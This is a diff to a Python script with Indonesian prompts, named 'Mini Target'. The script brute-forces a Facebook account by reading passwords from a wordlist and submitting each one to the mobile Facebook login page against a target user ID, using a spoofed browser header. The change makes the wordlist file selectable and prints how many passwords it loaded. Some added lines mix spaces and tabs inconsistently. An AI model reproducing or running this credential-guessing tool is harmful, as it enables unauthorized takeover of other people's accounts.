@@ -81,12 +81,14 @@ def target():
 		os.system('clc')
 	nama = pyfiglet.figlet_format('Mini Target')
 	print(nama)
+        k = input('Masukin Nama Wordlistnya > ')
 	target = input('Masukan Id Fb Target > ')
 	url = 'https://m.facebook.com/login.php'
 	headers = {
 		'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Accept-Langue' : 'en-US,en:q=0.5'
 	}
-	password = open('wordlist.txt','r').readlines()
+	password = open(k,'r').readlines()
+        print('Jumlah Password : ',len(password))
 	for i in password:
 		pw = i.strip()
 		data = {
